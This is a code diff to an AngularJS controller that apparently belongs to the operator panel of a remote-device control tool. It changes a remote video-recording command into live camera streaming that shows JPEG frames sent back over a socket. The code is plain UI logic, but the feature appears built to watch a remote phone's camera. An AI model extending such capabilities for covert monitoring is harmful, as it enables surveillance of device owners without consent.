@@ -176,61 +176,50 @@ app.controller("GeoCtrl", function ($scope, $rootScope) {
 });
 
 
-//-----------------------Video Recording Controller (videoRecording.htm)------------------------
+//-----------------------Live Camera Controller (videoRecording.htm)------------------------
 app.controller("VidCtrl", function ($scope, $rootScope) {
     $VidCtrl = $scope;
-    var videoRecording = CONSTANTS.orders.videoRecording;
+    var liveCam = CONSTANTS.orders.liveCamera;
 
     $VidCtrl.$on('$destroy', () => {
-        socket.removeAllListeners(videoRecording);
+        socket.removeAllListeners(liveCam);
+        socket.emit(ORDER, { order: liveCam, sec: 0 });
     });
 
-    $VidCtrl.isVideo = false;
+    $VidCtrl.streaming = false;
 
-    $VidCtrl.Record = (seconds) => {
-        if (seconds) {
-            if (seconds > 0) {
-                $VidCtrl.load = 'loading';
-                $rootScope.Log('Recording video ' + seconds + "'s...");
-                socket.emit(ORDER, { order: videoRecording, sec: seconds });
-            } else
-                $rootScope.Log('Seconds must be more than 0');
-        }
+    $VidCtrl.Start = () => {
+        $VidCtrl.load = 'loading';
+        $rootScope.Log('Starting live camera...');
+        socket.emit(ORDER, { order: liveCam, sec: 1 });
     }
 
-    socket.on(videoRecording, (data) => {
-        if (data.file == true) {
-            $VidCtrl.load = '';
-            $rootScope.Log('Video arrived', CONSTANTS.logStatus.SUCCESS);
+    $VidCtrl.Stop = () => {
+        $VidCtrl.load = '';
+        $VidCtrl.streaming = false;
+        document.getElementById('liveFrame').style.display = 'none';
+        $rootScope.Log('Live camera stopped');
+        socket.emit(ORDER, { order: liveCam, sec: 0 });
+    }
 
-            var player = document.getElementById('videoPlayer');
-            var source = document.getElementById('videoSource');
+    socket.on(liveCam, (data) => {
+        if (data.frame == true) {
+            $VidCtrl.load = '';
+            $VidCtrl.streaming = true;
+
+            var img = document.getElementById('liveFrame');
             var uint8Arr = new Uint8Array(data.buffer);
             var binary = '';
             for (var i = 0; i < uint8Arr.length; i++) {
                 binary += String.fromCharCode(uint8Arr[i]);
             }
-            var base64String = window.btoa(binary);
-
-            $VidCtrl.isVideo = true;
+            img.src = "data:image/jpeg;base64," + window.btoa(binary);
+            img.style.display = 'block';
             $VidCtrl.$apply();
-            source.src = "data:video/mp4;base64," + base64String;
-            player.load();
-            player.play();
-
-            $VidCtrl.SaveVideo = () => {
-                $rootScope.Log('Saving video..');
-                var filePath = path.join(downloadsPath, data.name);
-                fs.outputFile(filePath, data.buffer, (err) => {
-                    if (err)
-                        $rootScope.Log('Saving video failed', CONSTANTS.logStatus.FAIL);
-                    else
-                        $rootScope.Log('Video saved on ' + filePath, CONSTANTS.logStatus.SUCCESS);
-                });
-            };
         } else if (data.error) {
             $VidCtrl.load = '';
-            $rootScope.Log('Video recording failed', CONSTANTS.logStatus.FAIL);
+            $VidCtrl.streaming = false;
+            $rootScope.Log('Live camera error', CONSTANTS.logStatus.FAIL);
             $VidCtrl.$apply();
         }
     });
